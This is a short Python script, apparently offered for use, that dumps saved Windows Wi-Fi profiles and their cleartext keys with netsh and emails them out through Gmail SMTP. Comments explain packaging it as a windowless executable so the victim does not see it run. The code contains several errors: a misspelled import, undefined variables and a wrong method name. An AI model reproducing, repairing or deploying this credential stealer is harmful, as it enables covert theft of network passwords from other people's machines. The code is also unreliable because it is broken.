#!/usr/bin/env python3

# change your_email to your email, all three variables

# compile to exe :

# pip install pyinstaller

# pyinstaller --onefile --noconsole stealwifi.py

# output in dist/

import subprocess, re
try:
    import smptlib
except ImportError:
    print("[!] Error Please Install smtplib ")

your_email = "enter@email.com"
password = "email-password"

cmd = "netsh wlan show profile"
networks = subprocess.check_output(command,shell=True)
network_list = re.findall('(?:Profile\s*:\s)(.*)' , networks)

output = ""
for networks in network_list:
    command = "netsh wlan show profiles" + networks + " key=clear"
    one_network = subprocess.check_output(command, shell=True)
    final_output += one_network

server = smtplib.smtp("smtp.gmail.com", 587)
server.starttls()
server.login(your_email,password)
server.sendmail(your_email, your_email, "New Wifi Pass: %s " %final_output)
server.quit()
